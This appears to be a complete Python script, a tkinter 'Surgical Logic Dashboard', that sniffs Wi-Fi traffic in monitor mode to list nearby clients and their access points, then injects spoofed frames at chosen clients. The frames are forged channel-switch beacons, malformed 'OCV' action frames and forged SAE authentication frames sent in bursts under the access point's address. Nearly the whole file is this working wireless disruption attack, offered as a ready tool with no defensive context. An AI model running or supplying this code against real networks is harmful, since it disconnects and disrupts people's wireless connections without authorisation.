import os, sys, time, threading
from scapy.all import *
import tkinter as tk

class SurgicalDashboard:
    def __init__(self, iface):
        self.iface = iface
        self.discovered = {} # {ClientMAC: {"BSSID": bssid, "CH": ch}}
        self.running = True
        
        self.setup_monitor()
        
        self.root = tk.Tk()
        self.root.title("Surgical Logic Dashboard v3.5")
        self.root.geometry("900x700")
        self.root.configure(bg="#050505")

        # --- Target List ---
        tk.Label(self.root, text="LIVE AIRSPACE (CLIENT -> HOTSPOT)", fg="#00FF41", bg="#050505", font=("Courier", 12)).pack(pady=5)
        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", selectmode="multiple", font=("Courier", 10))
        self.listbox.pack(padx=10, fill="both", expand=True)

        # --- Controls ---
        btn_frame = tk.Frame(self.root, bg="#050505")
        btn_frame.pack(pady=10)
        
        tk.Button(btn_frame, text="CSA WHISPER", command=lambda: self.execute("CSA"), bg="#0044aa", fg="white", width=15).grid(row=0, column=0, padx=5)
        tk.Button(btn_frame, text="OCV VIOLATION", command=lambda: self.execute("OCV"), bg="#aa5500", fg="white", width=15).grid(row=0, column=1, padx=5)
        tk.Button(btn_frame, text="SAE RESET", command=lambda: self.execute("SAE"), bg="#880000", fg="white", width=15).grid(row=0, column=2, padx=5)
        
        # --- Background Logic ---
        threading.Thread(target=self.hopper, daemon=True).start()
        threading.Thread(target=self.scanner_logic, daemon=True).start()

    def setup_monitor(self):
        # Logic: Clean up processes and force monitor mode
        os.system("sudo airmon-ng check kill > /dev/null 2>&1")
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type monitor && sudo ip link set {self.iface} up")

    def hopper(self):
        ch = 1
        while self.running:
            os.system(f"sudo iw dev {self.iface} set channel {ch}")
            self.current_ch = ch
            ch = (ch % 13) + 1 # Logic: standard 2.4GHz range
            time.sleep(0.5)

    def scanner_logic(self):
        def process_packet(pkt):
            if pkt.haslayer(Dot11):
                # addr1=Dest, addr2=Source, addr3=BSSID
                # We want addr2 (Client) and addr3 (AP)
                src = pkt.addr2
                bssid = pkt.addr3
                
                if src and bssid and src != bssid and src != "ff:ff:ff:ff:ff:ff":
                    if src not in self.discovered:
                        self.discovered[src] = {"BSSID": bssid, "CH": self.current_ch}
                        # Update UI from thread safely
                        self.root.after(0, self.update_ui)
        
        sniff(iface=self.iface, prn=process_packet, store=0)

    def update_ui(self):
        self.listbox.delete(0, tk.END)
        for client, info in self.discovered.items():
            self.listbox.insert(tk.END, f"CLIENT: {client}  -->  AP: {info['BSSID']} [CH {info['CH']}]")

    def execute(self, mode):
        selection = self.listbox.curselection()
        for i in selection:
            client_mac = list(self.discovered.keys())[i]
            target_info = self.discovered[client_mac]
            # Lock to the target channel for the injection logic
            os.system(f"sudo iw dev {self.iface} set channel {target_info['CH']}")
            self.fire_packet(client_mac, target_info['BSSID'], mode)

    def fire_packet(self, target, bssid, mode):
        # Same injection logic as before, just mapped to the discovered client
        base = RadioTap()/Dot11(addr1=target, addr2=bssid, addr3=bssid)
        if mode == "CSA":
            pkt = base/Dot11Beacon()/Dot11Elt(ID=37, len=3, info=chr(1)+chr(13)+chr(1))
        elif mode == "OCV":
            pkt = base/Dot11Action(category=10, action=4)/Raw(load=b"\xff\x0a\x01\x01")
        elif mode == "SAE":
            pkt = base/Dot11Auth(algo=3, seqnum=1, status=0)
        
        sendp(pkt, iface=self.iface, count=30, inter=0.05, verbose=False)

    def shutdown(self):
        self.running = False
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type managed && sudo ip link set {self.iface} up && sudo systemctl restart NetworkManager")
        self.root.destroy()

if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: sudo python3 dashboard.py [interface]")
    else: SurgicalDashboard(sys.argv[1]).root.mainloop()
